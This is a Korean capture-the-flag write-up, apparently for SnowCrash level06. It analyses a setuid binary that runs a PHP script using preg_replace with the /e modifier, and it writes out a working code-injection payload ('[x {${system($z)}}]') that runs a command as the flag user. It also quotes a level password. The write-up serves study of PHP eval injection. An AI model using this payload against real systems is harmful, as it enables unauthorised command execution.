> password: viuaaale9huek52boumoomioc

홈 디렉토리의 파일 내용을 확인하면 다음과 같다.

```bash
$ ls -l
total 12
-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
```

`Sticky bit`가 설정된 `level06` 바이너리 및 `level06.php` 파일이 있다.

먼저, `level06` 바이너리를 실행해본다.

```bash
$ ./level06
PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4
```

PHP 오류가 발생한다. 직관적으로 에러메시지를 통해 `level06` 바이너리가 `/home/user/level06/level06.php` 파일 내용을 읽어 실행한 것으로 추측해볼 수 있다.

cat 으로 `level06.php` 파일을 읽어 출력해보면 내용이 다음과 같다.

```php
$ cat level06.php
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
```

포매팅이 잘 되어있지 않아 내용이 복잡하다. 읽기 쉽게 바꾸어보면 다음과 같다.

```php
#!/usr/bin/php
<?php
function y($m)
{
  $m = preg_replace("/\./", " x ", $m);
  $m = preg_replace("/@/", " y", $m);
  return $m;
}
function x($y, $z)
{
  $a = file_get_contents($y);
  $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
  $a = preg_replace("/\[/", "(", $a);
  $a = preg_replace("/\]/", ")", $a);
  return $a;
}
$r = x($argv[1], $argv[2]);
print $r;
?>
```

`$argv[1]` 경로의 파일 내용을 읽어서 정규식 처리를 하는 코드이다. `preg_replace` 함수를 통해서 특정 정규식을 찾아내고, `/e` 플래그를 통해 `y("\2")` 함수를 실행한 결과로 치환하는 형태를 취하고 있다.

`y("\2")` 에서 `\2`는 정규식에 매칭되는 2번째 그룹을 의미한다. 따라서, `(.*)` 부분이 해당된다.

`/e` 플래그가, 인자로 넘겨진 내용을 evaluate 가능하다는 것을 악용하여 다음과 같이 첫 번째 인자를 넣으면 `$argv[2]`에 해당하는 코드를 실행시킬 수 있다.

`${}` 는 중괄호 내부의 구문을 처리하여 가상의 변수의 형태로 나온다. 여기에 다시 한 번 중괄호를 씌워서 이 가상 변수의 내용을 문자열로 만들어 출력시킨다. 

*(PHP Complex (curly) syntax)*

```
[x {${system($z)}}]
```

```bash
$ cat > '/tmp/level06' <<< '[x {${system($z)}}]'
$ ./level06 '/tmp/level06' getflag
PHP Notice:  Undefined variable: Check flag.Here is your token : [...]
```
